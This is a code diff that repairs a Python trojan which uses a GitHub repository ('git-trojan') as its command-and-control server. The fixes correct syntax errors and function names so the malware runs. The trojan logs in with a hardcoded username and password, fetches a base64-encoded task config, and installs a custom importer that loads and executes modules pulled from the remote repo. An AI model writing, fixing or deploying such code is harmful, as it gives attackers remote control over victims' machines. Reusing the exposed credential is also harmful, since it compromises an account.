@@ -11,7 +11,7 @@ from github3 import login
 
 trojan_id = "abc"
 
-trojan_config = %s.json" % trojan_id
+trojan_config = "%s.json" % trojan_id
 data_path = "data/%s/" % trojan_id
 trojan_modules = []
 configured = False
@@ -19,7 +19,7 @@ task_queue = Queue.Queue()
 
 def connect_github():
 	gh = login (username="x00xFF", password="-Kkxe6wyyjntb")
-	repo = gh.repository("x00xFF", password="git-trojan")
+	repo = gh.repository("x00xFF", "git-trojan")
 	branch = repo.branch("master")
 	
 	return gh,repo,branch
@@ -28,14 +28,14 @@ def connect_github():
 def get_file_contents(filepath):
 
 
-	gh,repo,branch = connect_to_github()
+	gh,repo,branch = connect_github()
 	tree = branch.commit.commit.tree.recurse()
 
-	for filename in tree.tree
+	for filename in tree.tree:
 		
-		if filename in tree.tree:
-			print"[*] Found file %s" % filepath
-			blob = repo.blob(filename._json_data[sha'])
+		if filepath in filename.path:
+			print "[*] Found file %s" % filepath
+			blob = repo.blob(filename._json_data['sha'])
 			return blob.content
 
 	return None
@@ -43,7 +43,7 @@ def get_file_contents(filepath):
 #retrieve the remote config document from teh repo
 def get_trojan_config():
 	global configured
-	config_json 	= getfile_contents(trojan_config)
+	config_json 	= get_file_contents(trojan_config)
 	config 		= json.loads(base64.b64decode(config_json))
 	configured	= True
 
@@ -66,8 +66,8 @@ def store_module_result(data):
 
 
 class GitImporter(object):
-	def __init__(delf):
-	self.current_module_code = ""
+	def __init__(self):
+		self.current_module_code = ""
 	
 	def find_module(self,fullname,path=None):
 		if configured:
@@ -105,7 +105,7 @@ sys.meta_path = [GitImporter()]
 
 
 while True:
-	if task_queue.empty()
+	if task_queue.empty():
 		config	= get_trojan_config()
 
 		for task in config:
